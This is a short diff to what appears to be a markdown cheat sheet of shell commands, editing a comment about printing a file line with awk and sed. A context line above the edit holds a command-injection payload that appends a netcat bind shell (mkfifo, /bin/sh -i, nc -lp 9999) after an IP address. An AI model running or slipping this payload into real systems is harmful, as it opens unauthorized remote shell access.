@@ -271,7 +271,7 @@ lsb_release -a
 192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
 ```
 
-* Print out the content of a file at LINE number (-n in sed is quiet)
+* Print out the content of a file at LINE number (-n in sed is quiet), p = print
 ```bash
 awk 'NR=LINE{print}' FILE
 sed -n -e LINEp FILE
